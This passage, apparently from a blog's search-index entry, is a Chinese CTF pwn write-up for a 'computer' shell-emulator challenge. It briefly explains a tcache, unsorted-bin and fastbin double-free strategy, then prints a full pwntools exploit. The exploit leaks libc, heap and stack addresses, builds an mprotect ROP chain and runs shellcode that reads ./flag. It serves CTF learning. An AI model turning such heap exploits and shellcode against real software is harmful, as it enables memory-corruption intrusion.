--exec_num;      printf(&quot;%d had been killed\n&quot;, v12);    &#125;  &#125;</code></pre><p>这里我们采用的方式是先填充tcache，通过unsortbin来泄露libc和heap基地址，然后在fastbin中构造A-B-A来进攻击，最后修改我们menu函数的返回值来写ROP</p><p>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./computer&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;a&#39;*0xe7)for i in range(16):    sla(&quot;&gt; &quot;, b&#39;exec &#39; + b&#39;a&#39;*0xe7)for i in range(10):    sla(&quot;&gt; &quot;, b&#39;touch &#39; + str(i).encode())for i in range(8)[::-1]:    sla(&quot;&gt; &quot;, b&quot;kill &quot; + str(i).encode())# now we have tcache(0x20):7, tcache(0xf0):7, fastbin(0x20):1, unsortbin(0xf0):1sla(&quot;&gt; &quot;, b&quot;ps&quot;)libc_base = get_address() - 0x3ebca0slog(&quot;libc_base&quot;, libc_base)libc = ELF(&#39;./libc-2.27.so&#39;)sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;b&#39;*8 + p64(libc_base + libc.sym[&#39;_environ&#39;]))sla(&quot;&gt; &quot;, b&#39;ps&#39;)ru(&#39;\x09&#39;)ru(&#39;\x09&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x660slog(&quot;heap_base&quot;, heap_base)ru(&#39;\x09&#39;)stack_addr = u64(rc(6).ljust(8, b&#39;\x00&#39;))slog(&quot;stack_addr&quot;, stack_addr)sla(&quot;&gt; &quot;, b&#39;rm 0&#39;)  #fix the tcachesla(&quot;&gt; &quot;, b&#39;rm 1&#39;)sla(&quot;&gt; &quot;, b&#39;kill 0&#39;)sla(&quot;&gt; &quot;, b&#39;mkdir new&#39;)sla(&quot;&gt; &quot;, b&#39;cd new&#39;)sla(&quot;&gt; &quot;, b&#39;touch 00&#39;)sla(&quot;&gt; &quot;, b&#39;touch 01&#39;)sla(&quot;&gt; &quot;, b&#39;touch 02&#39;)sla(&quot;&gt; &quot;, b&#39;touch &#39; + p64(stack_addr - 0xb28))sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;03&#39;*0x19)slog(&quot;stack_ret&quot;, stack_addr - 0xb28)pop_rdi = libc_base + 0x2164fpop_rsi = libc_base + 0x23a6apop_rdx = libc_base + 0x1b96pop_rax = libc_base + 0x1b500jmp_rsp = libc_base + 0x2b25mprotect = libc_base + libc.sym[&#39;mprotect&#39;]flag_addr = heap_base + 0x1b90add_rsp_sub = libc_base + 0xbaf9cpl = b&#39;a&#39;*8 + p64(add_rsp_sub) + b&#39;a&#39;*(0x100-0x26) + p64(pop_rdi) + p64((stack_addr - 0xb28)&amp;(~0xfff)) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx) +p64(7) + p64(mprotect)pl += p64(jmp_rsp)shellcode = asm(shellcraft.open(&quot;./flag&quot;, 0) + shellcraft.read(&#39;3&#39;, heap_base + 0x1440, 0x30) + shellcraft.write(1, heap_base + 0x1440, 0x30))pl += shellcodesla(&quot;&gt; &quot;, b&#39;touch &#39; + pl)io.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTFwp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
